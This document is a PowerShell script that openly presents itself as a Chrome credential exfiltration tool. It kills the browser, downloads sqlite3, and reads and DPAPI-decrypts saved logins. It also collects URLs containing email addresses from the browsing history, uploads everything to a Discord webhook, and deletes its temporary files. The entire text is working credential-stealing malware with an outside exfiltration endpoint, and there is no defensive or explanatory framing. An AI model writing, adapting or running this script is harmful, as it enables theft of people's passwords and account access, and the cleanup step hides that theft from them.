# chrome_exfil.ps1 - Full Chrome Credential Exfiltration with DPAPI Decryption
# Requires: Admin privileges, Internet access

$ErrorActionPreference = "Stop"

# ===== CONFIGURATION =====
$webhookURL = "https://discord.com/api/webhooks/1234567890123456789/AbCdEfGhIjKlMnOpQrStUvWxYz1234567890abcdefghijklmnopqrstu"
$tempDir = "$env:TEMP\ChromeExfil"
$logFile = "$tempDir\exfil_log.txt"
$chromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$chromeHistory = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
# =========================

# Create temp directory
if (-not (Test-Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
}

# Logging function
function Log-Msg { param($msg); Add-Content -Path $logFile -Value "$(Get-Date -Format 'HH:mm:ss') $msg" }

Log-Msg "Starting Chrome credential exfiltration..."

# Kill Chrome to avoid file locks
if (Get-Process chrome -ErrorAction SilentlyContinue) {
    Log-Msg "Chrome detected. Killing process..."
    Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}

# Download SQLite tool
$zipPath = "$env:TEMP\sqlite.zip"
$exePath = "$env:TEMP\sqlite3.exe"
try {
    Invoke-WebRequest -Uri "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3390200.zip" -OutFile $zipPath -UseBasicParsing
    Expand-Archive -Path $zipPath -DestinationPath $env:TEMP -Force
    Move-Item "$env:TEMP\sqlite-tools-win32-x86-3390200\sqlite3.exe" -Destination $exePath -Force
    Log-Msg "SQLite downloaded and extracted."
}
catch {
    Log-Msg "Failed to download SQLite: $_"
    exit 1
}

# ===== EXTRACT AND DECRYPT PASSWORDS =====
$passwords = @()
$decryptedFile = "$tempDir\decrypted_passwords.txt"

try {
    # Extract raw data from Chrome's SQLite database
    $rawData = & $exePath $chromeLoginData "SELECT origin_url, username_value, password_value FROM logins"

    # Decrypt using Windows DPAPI
    $passwords = $rawData | ForEach-Object {
        if ($_ -match '^([^|]+)\|([^|]+)\|(.+)$') {
            $url = $matches[1]
            $username = $matches[2]
            $encryptedBlob = [System.Convert]::FromBase64String($matches[3])

            try {
                $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
                    $encryptedBlob,
                    $null,
                    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                )
                $password = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
            }
            catch {
                $password = "[DECRYPTION FAILED]"
            }

            [PSCustomObject]@{
                URL = $url
                Username = $username
                Password = $password
            }
        }
    }

    # Format output
    $passwords | ForEach-Object {
        "🔗 URL: $($_.URL)n👤 Username: $($_.Username)n🔑 Password: $($_.Password)n" + "-"*50 + "n"
    } | Out-File -FilePath $decryptedFile -Encoding UTF8

    Log-Msg "Passwords extracted and decrypted successfully."
}
catch {
    Log-Msg "Failed to extract/decrypt passwords: $_"
    exit 2
}

# ===== EXTRACT EMAILS FROM HISTORY =====
$emailsFile = "$tempDir\emails.txt"
try {
    & $exePath $chromeHistory "SELECT url FROM urls WHERE url LIKE '%@%'" > $emailsFile
    Log-Msg "Email addresses extracted from history."
}
catch {
    Log-Msg "Failed to extract emails: $_"
    exit 3
}

# ===== SEND TO DISCORD WEBHOOK =====
try {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $content = "🔓 Chrome Credential Exfiltration - $timestamp"
    $body = @{
        content = $content
        file1 = [IO.File]::ReadAllBytes($decryptedFile)
        file2 = [IO.File]::ReadAllBytes($emailsFile)
    }
    Invoke-RestMethod -Uri $webhookURL -Method Post -Form $body
    Log-Msg "Data sent to Discord webhook successfully."
}
catch {
    Log-Msg "Failed to send data to Discord: $_"
    exit 4
}

# ===== CLEANUP =====
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
Remove-Item $exePath -Force -ErrorAction SilentlyContinue
Log-Msg "Script completed and cleaned up."